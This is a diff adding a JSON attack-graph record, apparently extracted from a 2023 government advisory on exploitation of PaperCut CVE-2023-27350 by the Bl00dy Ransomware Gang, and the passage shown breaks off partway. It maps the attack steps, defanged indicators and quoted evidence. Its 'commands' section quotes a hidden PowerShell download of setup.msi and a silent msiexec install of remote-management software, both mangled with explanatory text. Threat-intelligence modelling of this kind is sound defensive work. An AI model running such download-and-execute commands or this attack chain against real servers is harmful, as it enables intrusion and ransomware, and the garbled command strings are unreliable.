@@ -1,0 +1,2058 @@
+{
+ "schema_version": "1.0",
+ "name": "csa-2023-230512",
+ "provenance": {
+  "input_kind": "markdown",
+  "input_sha256": "f286ac80380d0e581be06e8500032f7f55f84a6774fc70fe153c9574293977e0",
+  "source_name": "csa-2023-230512"
+ },
+ "actions": [
+  {
+   "id": "a1",
+   "name": "Exploit CVE-2023-27350 to bypass authentication and execute remote code",
+   "source": "llm",
+   "description": "Malicious actors exploited CVE-2023-27350 beginning in mid-April 2023 and continuing through the present, allowing unauthenticated remote code execution on vulnerable PaperCut MF and NG servers.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-1",
+    "evidence-2"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "not_reproducible",
+   "reproducibility_reason": "The target host has no deployable service, so it is left out of deployment; this step is not reproduced until a service or substitute is supplied for that host."
+  },
+  {
+   "id": "a2",
+   "name": "Access PaperCut server as administrator via SetupCompleted Java class authentication bypass",
+   "source": "llm",
+   "description": "Actors bypass user authentication by exploiting improper access controls in the SetupCompleted Java class, gaining administrator access to the PaperCut server.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-3"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "not_reproducible",
+   "reproducibility_reason": "The target host has no deployable service, so it is left out of deployment; this step is not reproduced until a service or substitute is supplied for that host."
+  },
+  {
+   "id": "a3",
+   "name": "Execute remote code using PaperCut print scripting interface",
+   "source": "llm",
+   "description": "Use the print scripting interface to execute shell commands on the compromised PaperCut server.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-4",
+    "evidence-5"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "not_reproducible",
+   "reproducibility_reason": "The target host has no deployable service, so it is left out of deployment; this step is not reproduced until a service or substitute is supplied for that host."
+  },
+  {
+   "id": "a4",
+   "name": "Execute remote code using User/Group Sync interface living-off-the-land attack",
+   "source": "llm",
+   "description": "Use the User/Group Sync interface to execute a living-off-the-land-style attack on the compromised PaperCut server.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-6"
+   ],
+   "epistemic_status": "insufficient",
+   "outcome": "succeeded",
+   "reproducibility": "not_reproducible",
+   "reproducibility_reason": "The target host has no deployable service, so it is left out of deployment; this step is not reproduced until a service or substitute is supplied for that host."
+  },
+  {
+   "id": "a5",
+   "name": "Spawn child processes cmd.exe or powershell.exe with SYSTEM/root privileges",
+   "source": "llm",
+   "description": "Exploit PaperCut server process pc-app.exe running with SYSTEM/root privileges to spawn child processes such as cmd.exe or powershell.exe with the same privileges for post-exploitation activity.",
+   "target_host_ref": "h1",
+   "evidence_refs": [
+    "evidence-7",
+    "evidence-8"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "not_reproducible",
+   "reproducibility_reason": "The target host has no deployable service, so it is left out of deployment; this step is not reproduced until a service or substitute is supplied for that host."
+  },
+  {
+   "id": "a6",
+   "name": "Download and execute legitimate remote management and maintenance (RMM) software",
+   "source": "llm",
+   "description": "Download and execute legitimate RMM software on victim systems via commands issued through PaperCut’s print scripting interface.",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "source_host_ref": "h1",
+   "reproducibility": "not_reproducible",
+   "reproducibility_reason": "The target host has no deployable service, so it is left out of deployment; this step is not reproduced until a service or substitute is supplied for that host."
+  },
+  {
+   "id": "a7",
+   "name": "Use Tor and other proxies for external network communications to mask malicious traffic",
+   "source": "llm",
+   "description": "Use Tor and/or other proxies from inside victim networks to mask malicious network traffic.",
+   "target_host_ref": "unknown",
+   "evidence_refs": [
+    "evidence-9"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "not_reproducible",
+   "reproducibility_reason": "Catalogue has no exact component/version and safe validation mapping for this action; provide the target software, version, and expected evidence."
+  },
+  {
+   "id": "a8",
+   "name": "Download and execute command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Beacons",
+   "source": "llm",
+   "description": "Download and execute C2 malware including DiceLoader, TrueBot, and Cobalt Strike Beacons during the attack.",
+   "target_host_ref": "unknown",
+   "evidence_refs": [
+    "evidence-10"
+   ],
+   "epistemic_status": "supported",
+   "reproducibility": "not_reproducible",
+   "reproducibility_reason": "Catalogue has no exact component/version and safe validation mapping for this action; provide the target software, version, and expected evidence."
+  },
+  {
+   "id": "a9",
+   "name": "Leave ransom notes demanding payment for decryption",
+   "source": "llm",
+   "description": "Bl00dy Ransomware Gang left ransom notes on victim systems demanding payment in exchange for decryption of encrypted files.",
+   "target_host_ref": "h2",
+   "evidence_refs": [
+    "evidence-11"
+   ],
+   "epistemic_status": "supported",
+   "outcome": "succeeded",
+   "reproducibility": "not_reproducible",
+   "reproducibility_reason": "The target host has no deployable service, so it is left out of deployment; this step is not reproduced until a service or substitute is supplied for that host."
+  }
+ ],
+ "relations": [
+  {
+   "id": "r1",
+   "from_action": "a1",
+   "to_action": "a2",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "authentication bypass enables access as administrator",
+   "evidence_refs": [
+    "evidence-3"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r2",
+   "from_action": "a2",
+   "to_action": "a3",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "RCE via print scripting interface after admin access",
+   "evidence_refs": [
+    "evidence-12"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "r3",
+   "from_action": "a2",
+   "to_action": "a4",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "RCE via User/Group Sync interface after admin access",
+   "evidence_refs": [
+    "evidence-13"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "id": "r4",
+   "from_action": "a3",
+   "to_action": "a6",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "RMM software downloaded and executed via commands issued through print scripting interface",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r5",
+   "from_action": "a3",
+   "to_action": "a5",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "RCE used to supply commands to cmd.exe or powershell.exe child process",
+   "evidence_refs": [
+    "evidence-8"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "id": "r6",
+   "from_action": "a5",
+   "to_action": "a7",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "External network communications through Tor and/or other proxies from inside victim networks",
+   "evidence_refs": [
+    "evidence-9"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  },
+  {
+   "id": "r7",
+   "from_action": "a5",
+   "to_action": "a8",
+   "kind": "dependency",
+   "source": "llm",
+   "rationale": "Download and execution of C2 malware after post-exploitation commands",
+   "evidence_refs": [
+    "evidence-10"
+   ],
+   "epistemic_status": "inferred",
+   "epistemic_reason": "引句存在於原文，但沒有陳述先後或相依的字眼；此關係是依敘事順序推論，需人工確認。"
+  }
+ ],
+ "hosts": [
+  {
+   "id": "h1",
+   "role": "PaperCut MF and NG servers vulnerable to CVE-2023-27350",
+   "source": "llm",
+   "name": "PaperCut server",
+   "evidence_refs": [
+    "evidence-14",
+    "evidence-3",
+    "evidence-15"
+   ],
+   "epistemic_status": "insufficient",
+   "service_refs": [
+    "s1",
+    "s2",
+    "s3",
+    "s4"
+   ]
+  },
+  {
+   "id": "h2",
+   "role": "Victim systems in networks where PaperCut servers were exploited, targeted for ransomware and malware deployment",
+   "source": "llm",
+   "name": "Victim systems",
+   "evidence_refs": [
+    "evidence-16",
+    "evidence-5",
+    "evidence-11"
+   ],
+   "epistemic_status": "supported",
+   "service_refs": []
+  }
+ ],
+ "services": [
+  {
+   "id": "s1",
+   "name": "PaperCut MF and NG",
+   "source": "llm",
+   "version": "8.0.0 to 19.2.7, 20.0.0 to 20.1.6, 21.0.0 to 21.2.10, 22.0.0 to 22.0.8",
+   "cve": [
+    "CVE-2023-27350"
+   ],
+   "host_ref": "h1",
+   "evidence_refs": [
+    "evidence-17"
+   ],
+   "epistemic_status": "insufficient",
+   "no_component": true,
+   "is_substitute": false,
+   "tier": "unavailable",
+   "version_basis": "stated",
+   "reproduces_cve": [],
+   "not_reproducible": true,
+   "not_reproducible_reason": "PaperCut MF and NG is not in the inventory and no substitute matches; not reproducible. Named CVE(s) CVE-2023-27350 are not reproducible by any inventory component."
+  },
+  {
+   "id": "s2",
+   "name": "pc-app.exe process",
+   "source": "llm",
+   "host_ref": "h1",
+   "evidence_refs": [
+    "evidence-15"
+   ],
+   "epistemic_status": "supported",
+   "no_component": true,
+   "is_substitute": false,
+   "tier": "unavailable",
+   "version_basis": "assumed",
+   "reproduces_cve": [],
+   "not_reproducible": true,
+   "not_reproducible_reason": "pc-app.exe process is not in the inventory and no substitute matches; not reproducible."
+  },
+  {
+   "id": "s3",
+   "name": "Print scripting interface",
+   "source": "llm",
+   "host_ref": "h1",
+   "evidence_refs": [
+    "evidence-18",
+    "evidence-5"
+   ],
+   "epistemic_status": "supported",
+   "no_component": true,
+   "is_substitute": false,
+   "tier": "unavailable",
+   "version_basis": "assumed",
+   "reproduces_cve": [],
+   "not_reproducible": true,
+   "not_reproducible_reason": "Print scripting interface is not in the inventory and no substitute matches; not reproducible."
+  },
+  {
+   "id": "s4",
+   "name": "User/Group Sync interface",
+   "source": "llm",
+   "host_ref": "h1",
+   "evidence_refs": [
+    "evidence-19"
+   ],
+   "epistemic_status": "supported",
+   "no_component": true,
+   "is_substitute": false,
+   "tier": "unavailable",
+   "version_basis": "assumed",
+   "reproduces_cve": [],
+   "not_reproducible": true,
+   "not_reproducible_reason": "User/Group Sync interface is not in the inventory and no substitute matches; not reproducible."
+  }
+ ],
+ "target_context": {
+  "host_refs": [
+   "h1",
+   "h2"
+  ],
+  "service_refs": [
+   "s1",
+   "s2",
+   "s3",
+   "s4"
+  ]
+ },
+ "artifacts": [
+  {
+   "name": "pc-app.exe",
+   "type": "process",
+   "id": "art1",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-15"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "cmd.exe",
+   "type": "process",
+   "id": "art2",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-20"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "powershell.exe",
+   "type": "process",
+   "id": "art3",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-20"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "DiceLoader",
+   "type": "malware",
+   "id": "art4",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-21"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "TrueBot",
+   "type": "malware",
+   "id": "art5",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-21"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "Cobalt Strike Beacons",
+   "type": "malware",
+   "id": "art6",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-21"
+   ],
+   "epistemic_status": "insufficient"
+  },
+  {
+   "name": "Bl00dy Ransomware Gang ransom notes",
+   "type": "file",
+   "id": "art7",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-11"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "Legitimate remote management and maintenance (RMM) software",
+   "type": "software",
+   "id": "art8",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-5"
+   ],
+   "epistemic_status": "supported"
+  },
+  {
+   "name": "SetupCompleted Java class",
+   "type": "software component",
+   "id": "art9",
+   "source": "llm",
+   "evidence_refs": [
+    "evidence-3"
+   ],
+   "epistemic_status": "supported"
+  }
+ ],
+ "indicators": [
+  {
+   "id": "indicator-1",
+   "type": "cve",
+   "value": "CVE-2023-27350",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-22",
+    "evidence-23",
+    "evidence-24",
+    "evidence-25",
+    "evidence-26",
+    "evidence-27",
+    "evidence-28",
+    "evidence-29",
+    "evidence-30"
+   ]
+  },
+  {
+   "id": "indicator-2",
+   "type": "ip",
+   "value": "102.130.112[.]157",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-31"
+   ]
+  },
+  {
+   "id": "indicator-3",
+   "type": "ip",
+   "value": "172.106.112[.]46",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-32"
+   ]
+  },
+  {
+   "id": "indicator-4",
+   "type": "ip",
+   "value": "176.97.76[.]163",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-33"
+   ]
+  },
+  {
+   "id": "indicator-5",
+   "type": "ip",
+   "value": "192.160.102[.]164",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-34"
+   ]
+  },
+  {
+   "id": "indicator-6",
+   "type": "ip",
+   "value": "194.87.82[.]7",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-35"
+   ]
+  },
+  {
+   "id": "indicator-7",
+   "type": "ip",
+   "value": "195.123.246[.]20",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-36"
+   ]
+  },
+  {
+   "id": "indicator-8",
+   "type": "ip",
+   "value": "198.50.191[.]95",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-37"
+   ]
+  },
+  {
+   "id": "indicator-9",
+   "type": "ip",
+   "value": "206.197.244[.]75",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-38"
+   ]
+  },
+  {
+   "id": "indicator-10",
+   "type": "ip",
+   "value": "216.122.175[.]114",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-39"
+   ]
+  },
+  {
+   "id": "indicator-11",
+   "type": "ip",
+   "value": "46.4.20[.]30",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-40"
+   ]
+  },
+  {
+   "id": "indicator-12",
+   "type": "ip",
+   "value": "5.188.206[.]14",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-41"
+   ]
+  },
+  {
+   "id": "indicator-13",
+   "type": "ip",
+   "value": "5.8.18[.]233",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-42"
+   ]
+  },
+  {
+   "id": "indicator-14",
+   "type": "ip",
+   "value": "5.8.18[.]240",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-43"
+   ]
+  },
+  {
+   "id": "indicator-15",
+   "type": "ip",
+   "value": "80.94.95[.]103",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-44"
+   ]
+  },
+  {
+   "id": "indicator-16",
+   "type": "ip",
+   "value": "89.105.216[.]106",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-45"
+   ]
+  },
+  {
+   "id": "indicator-17",
+   "type": "ip",
+   "value": "92.118.36[.]199",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-46"
+   ]
+  },
+  {
+   "id": "indicator-18",
+   "type": "url",
+   "value": "http://192.184.35[.]216:443/",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-47"
+   ]
+  },
+  {
+   "id": "indicator-19",
+   "type": "ip",
+   "value": "192.184.35[.]216",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-48"
+   ]
+  },
+  {
+   "id": "indicator-20",
+   "type": "domain",
+   "value": "anydeskupdate[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-49"
+   ]
+  },
+  {
+   "id": "indicator-21",
+   "type": "domain",
+   "value": "anydeskupdates[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-50"
+   ]
+  },
+  {
+   "id": "indicator-22",
+   "type": "domain",
+   "value": "ber6vjyb[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-51"
+   ]
+  },
+  {
+   "id": "indicator-23",
+   "type": "domain",
+   "value": "netviewremote[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-52"
+   ]
+  },
+  {
+   "id": "indicator-24",
+   "type": "domain",
+   "value": "study.abroad[.]ge",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-53"
+   ]
+  },
+  {
+   "id": "indicator-25",
+   "type": "domain",
+   "value": "upd343.winserverupdates[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-54"
+   ]
+  },
+  {
+   "id": "indicator-26",
+   "type": "domain",
+   "value": "upd488.windowservicecemter[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-55"
+   ]
+  },
+  {
+   "id": "indicator-27",
+   "type": "domain",
+   "value": "updateservicecenter[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-56"
+   ]
+  },
+  {
+   "id": "indicator-28",
+   "type": "domain",
+   "value": "windowcsupdates[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-57"
+   ]
+  },
+  {
+   "id": "indicator-29",
+   "type": "domain",
+   "value": "windowservicecemter[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-58"
+   ]
+  },
+  {
+   "id": "indicator-30",
+   "type": "domain",
+   "value": "windowservicecentar[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-59"
+   ]
+  },
+  {
+   "id": "indicator-31",
+   "type": "domain",
+   "value": "windowservicecenter[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-60"
+   ]
+  },
+  {
+   "id": "indicator-32",
+   "type": "domain",
+   "value": "winserverupdates[.]com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-61"
+   ]
+  },
+  {
+   "id": "indicator-33",
+   "type": "domain",
+   "value": "github.com",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-62"
+   ]
+  }
+ ],
+ "commands": [
+  {
+   "id": "command-1",
+   "interpreter": "cmd",
+   "command": "cmd /c “powershell.exe -nop -w hidden Launches powershell.exe in a hidden window without loading the user's PowerShell profile. Invoke-WebRequest ‘<url>/setup.msi’ Downloads setup.msi, saving it as setup.msi, in the current",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-63"
+   ]
+  },
+  {
+   "id": "command-2",
+   "interpreter": "cmd",
+   "command": "cmd /c “msiexec /i setup.msi /qn Installs legitimate Atera RMM software on the IntegratorLogin=<email_address> system silently, with the specified email CompanyId=1” address and company ID properties",
+   "source": "program",
+   "epistemic_status": "supported",
+   "evidence_refs": [
+    "evidence-64"
+   ]
+  }
+ ],
+ "evidence": [
+  {
+   "id": "evidence-1",
+   "quote": "According to FBI information, malicious actors exploited CVE-2023-27350 beginning in mid-April 2023 and continuing through the present.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "4"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "According to FBI information, malicious actors exploited CVE 2023 27350 beginning in mid April 2023 and continuing through the present."
+  },
+  {
+   "id": "evidence-2",
+   "quote": "This vulnerability occurs in certain versions of PaperCut NG and PaperCut MF and enables an unauthenticated actor to execute malicious code remotely without credentials.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "4"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "This vulnerability occurs in certain versions of PaperCut NG and PaperCut MF and enables an unauthenticated actor to execute malicious code remotely without cre"
+  },
+  {
+   "id": "evidence-3",
+   "quote": "PaperCut servers vulnerable to CVE-2023-27350 implement improper access controls in the SetupCompleted Java class, allowing malicious actors to bypass user authentication and access the server as an administrator.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "PaperCut servers vulnerable to CVE 2023 27350 implement improper access controls in the SetupCompleted Java class, allowing malicious actors to bypass user auth"
+  },
+  {
+   "id": "evidence-4",
+   "quote": "There are currently two publicly known proofs of concept for achieving RCE in vulnerable PaperCut software: Using the print scripting interface to execute shell commands.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "There are currently two publicly known proofs of concept for achieving RCE in vulnerable PaperCut software: "
+  },
+  {
+   "id": "evidence-5",
+   "quote": "According to FBI information, legitimate remote management and maintenance (RMM) software was downloaded and executed on victim systems via commands issued through PaperCut’s print scripting interface.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "According to FBI information, legitimate remote management and maintenance (RMM) software was downloaded and executed on victim systems via commands issued thro"
+  },
+  {
+   "id": "evidence-6",
+   "quote": "There are currently two publicly known proofs of concept for achieving RCE in vulnerable PaperCut software: Using the User/Group Sync interface to execute a living-off-the-land-style attack.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "There are currently two publicly known proofs of concept for achieving RCE in vulnerable PaperCut software: "
+  },
+  {
+   "id": "evidence-7",
+   "quote": "The PaperCut server process pc-app.exe runs with SYSTEM- or root-level privileges. When the software is exploited to execute other processes such as cmd.exe or powershell.exe, these child processes are created with the same privileges.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "8"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The PaperCut server process pc app.exe runs with SYSTEM or root level privileges. When the software is exploited to execute other processes such as cmd.exe or p"
+  },
+  {
+   "id": "evidence-8",
+   "quote": "Malicious activity against PaperCut servers in mid-April used the RCE to supply commands to a cmd.exe or powershell.exe child process, which were then used to conduct further network exploitation.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "28"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Malicious activity against PaperCut servers in mid April used the RCE to supply commands to a cmd.exe or powershell.exe child process, which were then used to c"
+  },
+  {
+   "id": "evidence-9",
+   "quote": "External network communications through Tor and/or other proxies from inside victim networks helped Bl00dy Gang ransomware actors mask their malicious network traffic.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "External network communications through Tor and/or other proxies from inside victim networks helped Bl00dy Gang ransomware actors mask their malicious network t"
+  },
+  {
+   "id": "evidence-10",
+   "quote": "The FBI also identified information relating to the download and execution of command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Beacons, although it is unclear at which stage in the attack these tools were executed.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The FBI also identified information relating to the download and execution of command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Be"
+  },
+  {
+   "id": "evidence-11",
+   "quote": "The Bl00dy Ransomware Gang left ransom notes on victim systems demanding payment in exchange for decryption of encrypted files.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "strong",
+   "match_score": 0.9921,
+   "matched_text": "The Bl00dy Ransomware Gang left ransom notes on victim systems demanding payment in exchange for decryption of encrypted files"
+  },
+  {
+   "id": "evidence-12",
+   "quote": "After accessing the server, actors can leverage existing PaperCut software features for remote code execution (RCE). There are currently two publicly known proofs of concept for achieving RCE in vulnerable PaperCut software: Using the print scripting interface to execute shell commands.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "After accessing the server, actors can leverage existing PaperCut software features for remote code execution (RCE). There are currently two publicly known proo"
+  },
+  {
+   "id": "evidence-13",
+   "quote": "After accessing the server, actors can leverage existing PaperCut software features for remote code execution (RCE). There are currently two publicly known proofs of concept for achieving RCE in vulnerable PaperCut software: Using the User/Group Sync interface to execute a living-off-the-land-style attack.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 1.0,
+   "matched_text": "After accessing the server, actors can leverage existing PaperCut software features for remote code execution (RCE). There are currently two publicly known proo"
+  },
+  {
+   "id": "evidence-14",
+   "quote": "Malicious actors exploited CVE-2023-27350 beginning in mid-April 2023 and continuing through the present, allowing unauthenticated remote code execution on vulnerable PaperCut MF and NG servers.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "4"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.8696,
+   "matched_text": "alicious actors exploited CVE 2023 27350 beginning in mid April 2023 and continuing through the present"
+  },
+  {
+   "id": "evidence-15",
+   "quote": "The PaperCut server process pc-app.exe runs with SYSTEM- or root-level privileges.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "8"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "The PaperCut server process pc app.exe runs with SYSTEM or root level privileges."
+  },
+  {
+   "id": "evidence-16",
+   "quote": "In early May 2023, according to FBI information, the Bl00dy Ransomware Gang gained access to victim networks across the Education Facilities Subsector where PaperCut servers vulnerable to CVE-2023-27350 were exposed to the internet. Ultimately, some of these operations led to data exfiltration and encryption of victim systems.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "9"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "In early May 2023, according to FBI information, the Bl00dy Ransomware Gang gained access to victim networks across the Education Facilities Subsector where Pap"
+  },
+  {
+   "id": "evidence-17",
+   "quote": "CVE-2023-27350 allows a remote actor to bypass authentication and conduct remote code execution on the following affected installations of PaperCut:[1]\n•   Version 8.0.0 to 19.2.7\n•   Version 20.0.0 to 20.1.6\n•   Version 21.0.0 to 21.2.10\n•   Version 22.0.0 to 22.0.8",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": false,
+   "quote_match": "none",
+   "match_score": 0.0,
+   "matched_text": "CVE 2023 27350 allows a remote actor to bypass authentication and conduct remote code execution on the following affected installations of PaperCut:[1]"
+  },
+  {
+   "id": "evidence-18",
+   "quote": "Using the print scripting interface to execute shell commands.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Using the print scripting interface to execute shell commands."
+  },
+  {
+   "id": "evidence-19",
+   "quote": "Using the User/Group Sync interface to execute a living-off-the-land-style attack.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "Using the User/Group Sync interface to execute a living off the land style attack."
+  },
+  {
+   "id": "evidence-20",
+   "quote": "Malicious activity against PaperCut servers in mid-April used the RCE to supply commands to a cmd.exe or powershell.exe child process.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "28"
+   },
+   "quote_verified": true,
+   "quote_match": "strong",
+   "match_score": 0.9925,
+   "matched_text": "Malicious activity against PaperCut servers in mid April used the RCE to supply commands to a cmd.exe or powershell.exe child process"
+  },
+  {
+   "id": "evidence-21",
+   "quote": "Download and execute command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Beacons during the attack.",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "11"
+   },
+   "quote_verified": false,
+   "quote_match": "partial",
+   "match_score": 0.8462,
+   "matched_text": " command and control (C2) malware such as DiceLoader, TrueBot, and Cobalt Strike Beacons"
+  },
+  {
+   "id": "evidence-22",
+   "quote": "CVE-2023-27350",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "1"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 27350"
+  },
+  {
+   "id": "evidence-23",
+   "quote": "CVE-2023-27350",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "4"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 27350"
+  },
+  {
+   "id": "evidence-24",
+   "quote": "CVE-2023-27350",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "5"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 27350"
+  },
+  {
+   "id": "evidence-25",
+   "quote": "CVE-2023-27350",
+   "locator": {
+    "kind": "paragraph",
+    "ref": "7"
+   },
+   "quote_verified": true,
+   "quote_match": "exact",
+   "match_score": 1.0,
+   "matched_text": "CVE 2023 27350"
+  },
+  {
+   "id": "evidence-26",
+   "quote": "CVE-2023-27350",
+   "locator": {
